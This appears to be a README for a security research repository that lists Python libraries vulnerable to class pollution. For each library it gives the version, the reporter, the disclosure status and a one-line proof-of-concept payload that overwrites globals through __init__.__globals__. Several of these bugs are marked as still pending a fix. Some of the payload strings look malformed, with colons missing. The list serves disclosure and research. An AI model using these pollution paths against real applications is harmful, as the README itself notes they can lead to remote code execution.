## Python Class Pollution Vulnerability and its Gadgets

> A snake in the (polluted) grass

This repository contains a list of packages that are vulnerable to class pollution (i.e., prototype pollution in Python) and class pollution gadgets that can result in severe issues like RCE.

| Library | Stars | Version | Payloads | Found By | Status | CVE |
|:-------:|:-----:|:-------:|----------|:--------:|:------:|:---:|
| [clearml](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/clearml/README.md) | 5.7K | v1.16.5 | ```clearml.automation.TaskScheduler.add_task(task_overrides={'__init__.__globals__.__builtins__.getattr''polluted'})``` | BlackPyrl | Pending | N/A |
| [Mesop](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/mesop/README.md) | 5.7K | v0.13.0 | ```mesop.dataclass_utils.dataclass_utils.update_dataclass_from_json(obj, '{"__init__"{"__globals__"{"__name__""polluted"}}}')``` | BlackPyrl | Pending | N/A |
| [IssacLab](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/issaclab/README.md) | 2.5K | v1.4.0 | ```omni.isaac.lab.utils.dict.update_class_from_dict(obj, {'__init__':{'__globals__':{'__name__':"polluted"}}})``` | BlackPyrl | Pending | N/A |
| [deepdiff](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/deepdiff/README.md) | 2K | v8.0.0 | ```{"attribute_added" {"root['x']"namedtuple, "root['x'].'__globals__'['_sys'].'__name__'""polluted"}}``` | chilaxan | Accepted | CVE-2024-5254 |
| [glom](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/glom/README.md) | 1.9K | v24.11.0 | ```glom.assign(obj, '__init__.__globals__.__name__', 'polluted')``` | BlackPyrl | Pending | N/A |
| [pydash](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/pydash/README.md) | 1.3K | v5.1.2 | ```pydash.set_(obj1, '__init__.__globals__.__name__', "polluted")``` | abdulrah33m | Fixed | N/A |
| [OpenVINO™ Training Extensions](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/otx/README.md) | 1.2K | v2.2.2 | ```otx.engine.hpo.hpo_trial.set_using_dot_delimited_key("__init__.__globals__.__name__", "polluted", obj)``` | BlackPyrl | Pending | N/A |
